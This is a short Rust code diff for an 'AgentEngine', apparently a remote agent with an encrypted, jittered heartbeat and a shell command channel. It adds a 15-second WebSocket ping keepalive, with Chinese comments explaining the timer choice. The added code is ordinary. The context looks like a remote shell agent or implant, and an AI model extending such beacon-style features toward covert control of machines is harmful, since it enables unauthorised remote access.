@@ -213,6 +213,12 @@ impl AgentEngine {
         // WS 按需命令通道：true = 服务端要求建立 WS；false = 释放。
         let (ws_cmd_tx, mut ws_cmd_rx) = tokio::sync::mpsc::unbounded_channel::<bool>();
 
+        // WS 客户端 Ping 保活（15s）：中间设备空闲超时会掐断无流量长连接。
+        // 必须用 interval（循环外创建），select 里临时 sleep 会被每轮重置。
+        let mut ws_ping = tokio::time::interval(std::time::Duration::from_secs(15));
+        ws_ping.set_missed_tick_behavior(tokio::time::MissedTickBehavior::Delay);
+        ws_ping.tick().await; // 消耗首个立即完成的 tick
+
         // Spawn heartbeat task using its own HTTP client, AES-GCM encrypted
         // with the session key, with per-tick jitter. Signals a re-register if
         // the session is lost (e.g. the server restarted).
@@ -307,6 +313,11 @@ impl AgentEngine {
                                 ws.close().await;
                                 ws_connected = false;
                             }
+                        }
+
+                        _ = ws_ping.tick() => {
+                            // 保活：协议级 Ping（服务端/中间设备自动回 Pong）
+                            tx.send_ping().await;
                         }
 
                         Some(msg) = shell_rx.recv() => {
